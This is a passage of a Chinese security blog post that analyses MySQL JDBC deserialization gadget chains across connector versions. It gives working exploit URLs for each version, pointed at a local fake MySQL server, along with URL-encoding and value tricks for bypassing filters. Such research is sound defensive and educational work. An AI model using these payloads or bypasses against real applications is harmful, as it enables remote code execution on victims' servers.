src="/archives/2de96424/image-20250722105701507-175897532896615.png" alt="image-20250722105701507"></p><p>这段代码用于创建连接，<code>this.dbmd = getMetaData(false, false);</code>初始化数据库元数据对象。<code>initializeSafeStatementInterceptors();</code>初始化”安全模式”下的SQL拦截器，<code>createNewIO(false);</code>用于建立物理数据库连接，<code>unSafeStatementInterceptors();</code>启用常规SQL拦截器</p><p>跟进<code>createNewIO(false);</code>：</p><p><img src="/archives/2de96424/image-20250722110033648-175897532896616.png" alt="image-20250722110033648"></p><p>先获取连接信息，然后调用<code>connectOneTryOnly(isForReconnect, mergedProps);</code>方法：</p><p><img src="/archives/2de96424/image-20250906230512011-175897532896617.png" alt="image-20250906230512011"></p><p><code>coreConnect(mergedProps);</code>执行底层 TCP 握手 + MySQL 协议认证，即建立连接</p><p><img src="/archives/2de96424/image-20250722110822598-175897532896618.png" alt="image-20250722110822598"></p><p>将用户配置的 Statement 拦截器绑定到底层 IO 层</p><p>就是在建立TCP连接后对数据库会话进行“上下文初始化 和 状态恢复”并设置拦截器、读取服务器配置等作用</p><p>回到Connectionlmpl方法：</p><p><img src="/archives/2de96424/image-20250722111606345-175897532896619.png" alt="image-20250722111606345"></p><p>最后将新创建的连接对象注册到驱动的跟踪系统中并进行资源管理</p><h2 id="扩展参数带来的安全问题"><a href="#扩展参数带来的安全问题" class="headerlink" title="扩展参数带来的安全问题"></a>扩展参数带来的安全问题</h2><p>mysql JDBC中包含一个危险的扩展参数：autoDeserialize。这个参数配置为true时，JDBC客户端会自动反序列化返回的BLOB类型字段，BLOB为二进制形式的长文本数据</p><p><img src="/archives/2de96424/image-20250722114351016-175897532896620.png" alt="image-20250722114351016"></p><h2 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h2><p>由于后续mysql-connector-java会用到多个不同版本，所以依赖设置为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">    &lt;mysql.version&gt;<span class="number">5.1</span><span class="number">.28</span>&lt;/mysql.version&gt;</span><br><span class="line">  &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;$&#123;mysql.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">   &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>当需要切换版本时终端输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install &quot;-Dmysql.version=版本号&quot;</span><br></pre></td></tr></table></figure><p>查看版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn dependency:tree | findstr <span class="string">&quot;mysql-connector-java&quot;</span></span><br></pre></td></tr></table></figure><h3 id="datectCustomCollations链分析"><a href="#datectCustomCollations链分析" class="headerlink" title="datectCustomCollations链分析"></a>datectCustomCollations链分析</h3><h4 id="mysql-connector-java-5-1-19-5-1-28"><a href="#mysql-connector-java-5-1-19-5-1-28" class="headerlink" title="mysql-connector-java 5.1.19~5.1.28"></a>mysql-connector-java 5.1.19~5.1.28</h4><p>环境：mysql-connector-java 5.1.28</p><p>在前面分析代码时我们提到在进行数据库连接时使用了<code>createNewIO(false);</code>方法：</p><p><img src="/archives/2de96424/image-20250722114442194-175897532896621.png" alt="image-20250722114442194"></p><p>跟进后发现调用了<code>connectOneTryOnly(isForReconnect, mergedProps);</code>方法：</p><p><img src="/archives/2de96424/image-20250722114600819-175897532896622.png" alt="image-20250722114600819"></p><p>connectOneTryOnly方法中<code>coreConnect(mergedProps);</code>用于建立连接，会调用<code>initializePropsFromServer</code>方法，<code>initializePropsFromServer</code>方法内又会调用<code>buildCollationMapping</code>方法：</p><p><img src="/archives/2de96424/image-20250722114835959-175897532896723.png" alt="image-20250722114835959"></p><p>在<code>buildCollationMapping</code>方法中，stmt通过getMetadataSafeStatement()方法获取当前环境的StatementImpl对象，然后通过executeQuery方法执行SQL语句</p><p>然后执行Util.resultSetToMap方法，versionMeetsMinimum方法用于判断驱动版本：<br><img src="/archives/2de96424/image-20250722141728865-175897532896724.png" alt="image-20250722141728865"></p><p>在Util.resultSetToMap方法中会将SHOW COLLATION查询结果的第三列和第二列的值存放进mappedValues</p><p>还会调用ResultSetImpl对象的getObject方法，对应反序列化位置，需要字段类型为blob：<br><img src="/archives/2de96424/image-20250722142717770-175897532896725.png" alt="image-20250722142717770"></p><p>当字段为BLOB类型且扩展参数autoDeserialize为true，且SHOW COLLATION的返回结果需要有三个字段，就会从MySQL服务端中获取对应的字节码数据，且需要字段2或3为BLOB装载我们的序列化数据，那么在返回数据时就会触发反序列化造成攻击</p><p>这里使用4ra1n师傅做的mysql-fake-server项目来进行复现：</p><p><img src="/archives/2de96424/image-20250722153610046-175897532896726.png" alt="image-20250722153610046"></p><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:65432/test?autoDeserialize=true&amp;user=base64ZGVzZXJfQ0MzMV9jYWxjLmV4ZQ==&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Class.forName(CLASS_NAME);<span class="comment">// 注册驱动类</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2de96424/image-20250722153845991-175897532896727.png" alt="image-20250722153845991"></p><h4 id="mysql-connector-java-5-1-29-5-1-40"><a href="#mysql-connector-java-5-1-29-5-1-40" class="headerlink" title="mysql-connector-java 5.1.29~5.1.40"></a>mysql-connector-java 5.1.29~5.1.40</h4><p>环境：mysql-connector-java 5.1.29</p><p>改进部分在于com.mysql.jdbc.ConnectionImpl#buildCollationMapping方法：</p><p><img src="/archives/2de96424/image-20250722155444248-175897532896728.png" alt="image-20250722155444248"></p><p>不仅需要驱动版本大于4.1.0，还添加了新的要求：</p><p><img src="/archives/2de96424/image-20250722155546666-175897532896729.png" alt="image-20250722155546666"></p><p>getDetectCustomCollations方法返回扩展参数detectCustomCollations的值，若没设置，默认为false</p><p>只需要新添加扩展参数<code>detectCustomCollations=true</code>即可，这样才能进入Util.resultSetToMap方法调用getObject触发反序列化</p><p><img src="/archives/2de96424/image-20250722155727239-175897532896730.png" alt="image-20250722155727239"></p><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:65432/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=base64ZGVzZXJfQ0MzMV9jYWxjLmV4ZQ==&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Class.forName(CLASS_NAME);<span class="comment">// 注册驱动类</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2de96424/image-20250722155825213-175897532896731.png" alt="image-20250722155825213"></p><h4 id="mysql-connector-java-5-1-41-5-1-48"><a href="#mysql-connector-java-5-1-41-5-1-48" class="headerlink" title="mysql-connector-java 5.1.41~5.1.48"></a>mysql-connector-java 5.1.41~5.1.48</h4><p>环境：mysql-connector-java 5.1.41</p><p>依旧看改进的部分，定位到com.mysql.jdbc.ConnectionImpl#buildCollationMapping方法：</p><p><img src="/archives/2de96424/image-20250722163642145-175897532896732.png" alt="image-20250722163642145"></p><p>新加了customCharset变量需要为null，其默认为null，所以不用管</p><p><img src="/archives/2de96424/image-20250722163824449-175897532896733.png" alt="image-20250722163824449"></p><p>这里没有调用Util.resultSetToMap方法，而是改用直接调用results.getObject(3)，还是会调用getObject方法，不影响利用</p><p>但从mysql-connector-java 5.1.49以后，就不再调用results.getObject方法，该调用链就无效了</p><h4 id="mysql-connector-java-6-0-2-6-0-6"><a href="#mysql-connector-java-6-0-2-6-0-6" class="headerlink" title="mysql-connector-java 6.0.2~6.0.6"></a>mysql-connector-java 6.0.2~6.0.6</h4><p>环境：mysql-connector-java 6.0.6</p><p>该版本采用com.mysql.cj.jdbc.Driver作为驱动类，所以定位到com.mysql.cj.jdbc.Driver.ConnectionImpl#buildCollationMapping方法:</p><p><img src="/archives/2de96424/image-20250722170956098-175897532896734.png" alt="image-20250722170956098"></p><p>indexToCharset默认为null不用管，同时需要detectCustomCollations为ture</p><p><img src="/archives/2de96424/image-20250722171133867-175897532896735.png" alt="image-20250722171133867"></p><p>调用了ResultSetUtil.resultSetToMap方法：<br><img src="/archives/2de96424/image-20250722171227339-175897532896736.png" alt="image-20250722171227339"></p><p>同样调用了getObject方法</p><p><img src="/archives/2de96424/image-20250722171502758-175897532896737.png" alt="image-20250722171502758"></p><p>这里需要字段类型为BIT类型，后面的调用就类似的，所以利用链不影响</p><p><img src="/archives/2de96424/image-20250722171728373-175897532896738.png" alt="image-20250722171728373"></p><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:65432/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=base64ZGVzZXJfQ0MzMV9jYWxjLmV4ZQ==&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Class.forName(CLASS_NAME);<span class="comment">// 注册驱动类</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2de96424/image-20250722171832836-175897532896739.png" alt="image-20250722171832836"></p><h3 id="ServerStatusDiffInterceptor链分析"><a href="#ServerStatusDiffInterceptor链分析" class="headerlink" title="ServerStatusDiffInterceptor链分析"></a>ServerStatusDiffInterceptor链分析</h3><h4 id="mysql-connector-java-5-1-0-5-1-10"><a href="#mysql-connector-java-5-1-0-5-1-10" class="headerlink" title="mysql-connector-java 5.1.0~5.1.10"></a>mysql-connector-java 5.1.0~5.1.10</h4><p>环境：mysql-connector-java 5.1.1</p><p>在较低的mysql-connector-java版本下是不能利用datectCustomCollations链的：<br><img src="/archives/2de96424/image-20250722174109110-175897532896740.png" alt="image-20250722174109110"></p><p>所以这时就可以利用ServerStatusDiffInterceptor链</p><p>利用条件：需要连接后进行查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select database()&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">statement.execute(<span class="string">&quot;select database()&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>是在查询时触发反序列化，而前者是获取结果处触发</p></blockquote><p>执行完查询后，重点在获取结果位置，跟进executeQuery方法：<br><img src="/archives/2de96424/image-20250723093120157-175897532896741.png" alt="image-20250723093120157"></p><p>locallyScopedConn.useMaxRows方法默认返回false，会调用executeInternal方法：<br><img src="/archives/2de96424/image-20250723094229853-175897532896742.png" alt="image-20250723094229853"></p><p>利用当前连接对象调用execSQL方法，即ConnectImpl#execSQL:</p><p><img src="/archives/2de96424/image-20250723094516529-175897532896743.png" alt="image-20250723094516529"></p><p>接着执行sqlQueryDirect方法：<br><img src="/archives/2de96424/image-20250723094707543-175897532896744.png" alt="image-20250723094707543"></p><p>statementInterceptors不为null时调用invokeStatementInterceptorsPre方法：</p><p><img src="/archives/2de96424/image-20250723094953091-175897532896745.png" alt="image-20250723094953091"></p><p>这里对statementInterceptors进行遍历，但默认状态下statementInterceptors为0，所以需要找个方法控制它的值</p><p>MysqlIO类提供initializeStatementInterceptors方法来初始化StatementInterceptors：</p><p><img src="/archives/2de96424/image-20250723101116921-175897532896746.png" alt="image-20250723101116921"></p><p>而在ConnectionImpl类构造方法中，在执行createNewIO方法时实例化了MysqlIO对象：<br><img src="/archives/2de96424/image-20250723100818122-175897532896747.png" alt="image-20250723100818122"></p><p>最后又刚好触发了MysqlIO对象这个方法：</p><p><img src="/archives/2de96424/image-20250723101134394-175897532896748.png" alt="image-20250723101134394"></p><p>而ConnectionImpl类下的StatementInterceptors可以通过添加扩展参数设置</p><p>这个参数首先必须实现com.mysql.jdbc.StatementInterceptor接口，这里选用<code>com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</code>这个类，那么在invokeStatementInterceptorsPre方法中，会调用ServerStatusDiffInterceptor#preProcess方法：<br><img src="/archives/2de96424/image-20250723101410495-175897532896749.png" alt="image-20250723101410495"></p><p>驱动版本必须大于5.0.2，然后调用populateMapWithSessionStatusValues方法：</p><p><img src="/archives/2de96424/image-20250723101459699-175897532896750.png" alt="image-20250723101459699"></p><p>执行Util.resultSetToMap方法：</p><p><img src="/archives/2de96424/image-20250723101529808-175897532896751.png" alt="image-20250723101529808"></p><p>只需要SHOW SESSION STATUS语句返回的字段1或2的类型为blob，且内容为恶意的序列化数据即可</p><p><img src="/archives/2de96424/image-20250723101652041-175897532896752.png" alt="image-20250723101652041"></p><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:65432/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=base64ZGVzZXJfQ0MzMV9jYWxjLmV4ZQ==&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Class.forName(CLASS_NAME);<span class="comment">// 注册驱动类</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select database()&quot;</span>;</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2de96424/image-20250723101744004-175897532896753.png" alt="image-20250723101744004"></p><h4 id="mysql-connector-java-5-1-11-5-x-xx"><a href="#mysql-connector-java-5-1-11-5-x-xx" class="headerlink" title="mysql-connector-java 5.1.11~5.x.xx"></a>mysql-connector-java 5.1.11~5.x.xx</h4><p>环境：mysql-connector-java 5.1.29</p><p>定位到ConnectImpl#initializePropsFromServer方法：</p><p><img src="/archives/2de96424/image-20250723105412519-175897532896754.png" alt="image-20250723105412519"></p><p>跟进loadServerVariables方法：</p><p><img src="/archives/2de96424/image-20250723105504257-175897532896855.png" alt="image-20250723105504257"></p><p>执行executeQuery方法，跟进：</p><p><img src="/archives/2de96424/image-20250723105734883-175897532896856.png" alt="image-20250723105734883"></p><p>调用execSQL方法，后面的流程就一样了。</p><h4 id="mysql-connector-java-6-x"><a href="#mysql-connector-java-6-x" class="headerlink" title="mysql-connector-java 6.x"></a>mysql-connector-java 6.x</h4><p>和mysql-connector-java 5.1.11~5.x.xx分析流程是一样的，只不过包名换成了<code>com.mysql.cj.jdbc.Driver</code></p><h4 id="mysql-connector-java-8-0-7-8-0-20"><a href="#mysql-connector-java-8-0-7-8-0-20" class="headerlink" title="mysql-connector-java 8.0.7~8.0.20"></a>mysql-connector-java 8.0.7~8.0.20</h4><p>环境：mysql-connector-java 8.0.12</p><p>定位到ConnectionImpl#initializePropsFromServer方法，可以看到已经不是调用当前对象的loadServerVariables和buildCollationMapping方法</p><p><img src="/archives/2de96424/image-20250724091709925-175897532896857.png" alt="image-20250724091709925"></p><p>但其中调用了handleAutoCommitDefaults方法可以利用：</p><p><img src="/archives/2de96424/image-20250724091906390-175897532896858.png" alt="image-20250724091906390"></p><p><img src="/archives/2de96424/image-20250724092053004-17533200539801-175897532896859.png" alt="image-20250724092053004"></p><p>resetAutoCommitDefault会被赋值为true然后调用setAutoCommit方法：</p><p><img src="/archives/2de96424/image-20250724092911280-175897532896860.png" alt="image-20250724092911280"></p><p>needsSetOnServer赋值为true，会调用execSQL方法，跟进：</p><p><img src="/archives/2de96424/image-20250724093119610-17533206806513-175897532896861.png" alt="image-20250724093119610"></p><p>跟上面不同，调用的对象不同了，这里要利用的是sendQueryString方法：</p><p><img src="/archives/2de96424/image-20250724093337710-175897532896862.png" alt="image-20250724093337710"></p><p>调用sendQueryPacket方法：<br><img src="/archives/2de96424/image-20250724093432750-175897532896863.png" alt="image-20250724093432750"></p><p>跟上面的invokeStatementInterceptorsPre很像，跟进invokeQueryInterceptorsPre方法看看</p><p>但前提是queryInterceptors不为null</p><p>这里可以通过ConnectionImpl#connectOneTryOnly方法控制，当调用ConnectionImpl构造方法时会调用createNewIO从而调用connectOneTryOnly方法：</p><p><img src="/archives/2de96424/image-20250724093824929-175897532896864.png" alt="image-20250724093824929"></p><p><img src="/archives/2de96424/image-20250724093833218-175897532896865.png" alt="image-20250724093833218"></p><p><img src="/archives/2de96424/image-20250724093850759-175897532896866.png" alt="image-20250724093850759"></p><p>同样可以通过扩展参数设置</p><p>进入invokeQueryInterceptorsPre方法：</p><p><img src="/archives/2de96424/image-20250724094107909-175897532896867.png" alt="image-20250724094107909"></p><p>逻辑跟之前版本差不多，调用了preProcess，设置queryInterceptors为<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code>，跟进ServerStatusDiffInterceptor#preProcess方法：<br><img src="/archives/2de96424/image-20250724094348350-175897532896868.png" alt="image-20250724094348350"></p><p>跟进populateMapWithSessionStatusValues方法：</p><p><img src="/archives/2de96424/image-20250724094419648-175897532896869.png" alt="image-20250724094419648"></p><p>执行ResultSetUtil.resultSetToMap方法：</p><p><img src="/archives/2de96424/image-20250724094711507-175897532896870.png" alt="image-20250724094711507"></p><p>最后执行了getObject方法</p><p><img src="/archives/2de96424/image-20250724101550740-175897532896871.png" alt="image-20250724101550740"></p><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:65432/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=base64ZGVzZXJfQ0MzMV9jYWxjLmV4ZQ==&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Class.forName(CLASS_NAME);<span class="comment">// 注册驱动类</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL);</span><br><span class="line"></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">        statement.execute(<span class="string">&quot;select database()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2de96424/image-20250724101527921-175897532896872.png" alt="image-20250724101527921"></p><h4 id="mysql-connector-java-8-0-20以后"><a href="#mysql-connector-java-8-0-20以后" class="headerlink" title="mysql-connector-java 8.0.20以后"></a>mysql-connector-java 8.0.20以后</h4><p>populateMapWithSessionStatusValues方法下不再调用ResultSetUtil.resultSetToMap方法，也不直接调用getObject方法：<br><img src="/archives/2de96424/image-20250724095946826-175897532896873.png" alt="image-20250724095946826"></p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>环境：mysql-connector-java 8.0.12</p><h3 id="Urlencode绕过"><a href="#Urlencode绕过" class="headerlink" title="Urlencode绕过"></a>Urlencode绕过</h3><h4 id="协议头Urlencode"><a href="#协议头Urlencode" class="headerlink" title="协议头Urlencode"></a>协议头Urlencode</h4><p>逻辑位于<code>com.mysql.cj.conf.ConnetionUrlParser#isConnetionStringSupported</code>方法：</p><p><img src="/archives/2de96424/image-20250724101712809-175897532896874.png" alt="image-20250724101712809"></p><p>其中会对匹配部分进行一次decode方法处理，也就是一次Urldecode处理：</p><p><img src="/archives/2de96424/image-20250724101836213-175897532896875.png" alt="image-20250724101836213"></p><h4 id="path部分Urlencode"><a href="#path部分Urlencode" class="headerlink" title="path部分Urlencode"></a>path部分Urlencode</h4><p>辑位于<code>com.mysql.cj.conf.ConnectionUrlParser#parseConnectionString</code>方法：</p><p><img src="/archives/2de96424/image-20250724101951057-175897532896876.png" alt="image-20250724101951057"></p><p>path部分也进行了一次decode方法处理，此外还进行了trim方法处理，但方法不能去除字符串中间的空白字符，所以只能进行Urlencode绕过</p><h4 id="扩展参数Urlencode"><a href="#扩展参数Urlencode" class="headerlink" title="扩展参数Urlencode"></a>扩展参数Urlencode</h4><p>在实例化SingleConnectionUrl对象时，会触发父类构造方法：<br><img src="/archives/2de96424/image-20250724102158129-175897532896877.png" alt="image-20250724102158129"></p><p>调用collectProperties方法：</p><p><img src="/archives/2de96424/image-20250724102320789-17533238018385-175897532896878.png" alt="image-20250724102320789"></p><p>跟进getProperties方法，一直调用到parseQuerySection方法：</p><p><img src="/archives/2de96424/image-20250724102415433-175897532896879.png" alt="image-20250724102415433"></p><p>方法判断URL是否存在扩展参数，存在则调用processKeyValuePattern方法：</p><p><img src="/archives/2de96424/image-20250724102504053-175897532896880.png" alt="image-20250724102504053"></p><p>分离key和value，然后进行一次Urldecode，同样可以进行Urlencode编码</p><h3 id="扩展参数Value绕过"><a href="#扩展参数Value绕过" class="headerlink" title="扩展参数Value绕过"></a>扩展参数Value绕过</h3><p>由于<code>com.mysql.cj.conf.BooleanPropertyDefinition的AllowableValue</code>枚举类:</p><p><img src="/archives/2de96424/image-20250724102749419-175897532896881.png" alt="image-20250724102749419"></p><p>所以设置TRUE和设置YES是一样的</p><p><img src="/archives/2de96424/image-20250724102815701-175897532896882.png" alt="image-20250724102815701"></p><p>解析时还会转大写</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> Java基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDBC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java RMI反序列化深度解析</title>
      <link href="/archives/9738c3bd/"/>
      <url>/archives/9738c3bd/</url>
      
